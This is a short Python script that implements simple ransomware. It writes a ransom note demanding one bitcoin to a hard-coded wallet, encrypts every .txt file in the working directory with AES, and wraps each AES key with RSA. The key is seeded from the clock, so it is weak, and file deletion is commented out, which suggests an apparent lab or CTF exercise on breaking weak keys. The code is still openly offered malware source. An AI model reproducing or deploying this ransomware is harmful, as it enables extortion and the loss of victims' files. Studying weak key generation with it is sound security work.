import os
import time
import random
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA

def leave_ransom_note(wallet):
    with open('RANSOM_NOTE.txt', 'w') as f:
        f.write("""YOU HAVE BEEN HACKED, YOU WILL PLEASE SEND 
        1 (1.0) BITCOIN TO %s
        %s
        %s
        OR YOU WILL NEVER SEE YOURE FILES AGAIN\n""" % (wallet, wallet, wallet))

def encrypt_files(pubkey):
    for filename in os.listdir('.'):
        if filename.endswith('.txt'):
            encrypt_file(filename, pubkey)

def gen_key():
    random.seed(int(time.time()))
    key = str()
    for i in xrange(16):
        key += chr(random.randrange(256))
    return key

def encrypt_file(filename, pubkey):
    # generate a key for symmetric encryption
    secretkey = gen_key()
    aes = AES.new(secretkey)

    contents = open(filename).read()
    # pad contents so that the length is a multiple of 16
    padding_bytes = 16 - (len(contents) % 16)
    contents += chr(padding_bytes) * padding_bytes

    # encrypt the file
    open(filename + '.enc', 'w').write(aes.encrypt(contents))

    # encrypt the secret decryption key
    rsa = PKCS1_OAEP.new(pubkey)
    open(filename + '.key', 'w').write(rsa.encrypt(secretkey))

    # delete the original file
    # os.remove(filename)

def transact_server():
    # pretend this is done on the server :)
    rsakey = RSA.generate(2048)
    pubkey = rsakey.publickey()
    wallet = '1P4D4PSHHY8b2m45rw3dqrD1tV4LPECEpx'
    return wallet, pubkey

def main():
    wallet, pubkey = transact_server()
    leave_ransom_note(wallet)
    encrypt_files(pubkey)

if __name__ == '__main__': main()
